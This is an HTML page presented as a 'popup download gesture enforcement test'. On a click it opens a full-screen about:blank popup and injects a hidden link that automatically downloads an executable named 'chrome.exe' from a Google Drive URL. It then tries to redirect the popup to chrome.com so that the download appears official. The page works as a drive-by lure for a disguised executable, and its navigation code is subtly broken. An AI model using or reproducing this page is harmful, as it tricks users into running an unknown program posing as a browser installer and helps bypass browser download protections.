
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Popup Download Gesture Test</title>
<style>
body { font-family:sans-serif;padding:20px }
button { padding:12px 18px;font-size:16px }
pre { background:#111;color:#0f0;padding:10px }
</style>
</head>
<body>

<h3>Popup Download Gesture Enforcement Test</h3>
<button id="btn">Open Popup</button>
<pre id="log"></pre>

<script>
const logEl = document.getElementById("log");
const log = m => logEl.textContent += m + "\n";

document.getElementById("btn").onclick = () => {
  log("[1] User click received");

  // 1️⃣ Open popup to about:blank first
  const w = window.open(
    "about:blank",
    "_blank",
    `
      width=${screen.availWidth},
      height=${screen.availHeight},
      left=0,
      top=0,
      resizable=yes,
      scrollbars=yes
    `
  );

  if (!w) {
    log("[ERROR] Popup blocked");
    return;
  }

  log("[2] Popup opened at about:blank");

  // 2️⃣ Inject test payload WHILE origin is about:blank
  w.document.write(`
      <a id="dl" download="chrome.exe"
       href="https://drive.usercontent.google.com/download?id=1rpMF3HMNrGGL47CQEkcVLzS674trhujL&export=download&authuser=0&confirm=t&uuid=733afb2e-0d6c-4da7-8ec5-883d0b792a34&at=AGN2oQ0VkjDRWTpZ7Vs-SmKiGHJ6:1773905849768"></a>
    <script>
      setTimeout(() => {
        document.getElementById("dl").click();
        document.body.insertAdjacentHTML(
          'beforeend',
          '<p></p>'
        );
      }, 50);
    <\/script>
  `);

  // 3️⃣ Navigate to google.com AFTER
  setTimeout(() => {
    try {
      w.location.replace = "https://www.chrome.com";
      log("[3] Popup navigated to google.com");
    } catch (e) {
      log("[ERROR] Navigation failed: " + e);
    }
  }, 0);
};
</script>

</body>
</html>
